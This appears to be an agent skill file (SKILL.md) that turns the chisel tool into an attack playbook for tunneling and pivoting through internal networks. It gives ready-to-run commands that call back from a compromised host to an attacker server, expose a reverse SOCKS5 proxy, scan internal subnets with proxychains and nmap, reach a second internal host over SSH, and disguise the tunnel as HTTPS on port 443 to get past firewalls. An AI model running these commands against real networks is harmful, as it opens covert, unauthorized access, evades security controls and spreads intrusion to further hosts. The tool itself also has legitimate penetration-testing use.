---
name: chisel-tunnel
description: "chisel: Pivots into internal networks with reverse SOCKS5. Signals: internal network tunneling, tunnel, server-side authentication."
zh-signals: "chisel: 反向 SOCKS5 打穿内网(最常用)、跳板到内网第二台机器。信号:内网穿透,隧道,服务端加认证。"
when-to-use: >-
  Use when you need a reverse SOCKS5 tunnel from a compromised host into an
  internal network, or want to forward traffic to other internal machines.
  Requires a reachable chisel server on the attacker side and a client on the
  controlled host.
---

# chisel

- Attack Category: C32 Tunneling and Internal Network Pivoting
- Upstream Repository: https://github.com/jpillora/chisel
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
# Single-file binary, no dependencies: download directly from https://github.com/jpillora/chisel/releases
go install github.com/jpillora/chisel@latest   # or install via Go
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `chisel server -p 8080 -reverse` | Server side (attacker machine), allows reverse tunnels |
| `chisel client attacker-IP:8080 R:1080:socks` | Client side (compromised host), calls back and exposes SOCKS5 |
| `chisel client attacker-IP:8080 9000:127.0.0.1:3389` | Forward forwarding: attacker machine 9000 → internal 3389 |
| `chisel client ... R:9000:10.0.0.5:22` | Reverse forwarding: attacker machine 9000 → another internal host 22 |
| `--auth user:pass` | Adds authentication to the server |
| `chisel server -p 443 --tls-key/--tls-cert` | Uses 443 to masquerade as HTTPS |

## Attack Scenario Playbook

### Reverse SOCKS5 pivot into the internal network (most common)

```bash
# Attacker machine
chisel server -p 8080 -reverse
# Compromised internal host
chisel client attacker-IP:8080 R:1080:socks
# On the attacker machine, configure proxychains with socks5 127.0.0.1:1080 to reach the internal network
proxychains nmap -sT -p 445,3389,22 10.0.0.0/24
```

### Pivot to a second internal machine

```bash
# Run on compromised host A: reverse forward the attacker machine's 9000 to host B's port 22
chisel client attacker-IP:8080 R:9000:10.0.0.6:22
ssh -p 9000 root@attacker-IP   # you actually log into host B
```

### Bypass a strict firewall (443 masquerade)

```bash
chisel server -p 443 -reverse --tls-cert cert.pem --tls-key key.pem
chisel client https://attacker-domain:443 R:1080:socks --auth agent:pass
```

## Notes

Lighter than frp (single file), suited to temporary tunnels; use TLS mode when the firewall only allows 443; when multiple clients reuse the same server, add `--auth`.
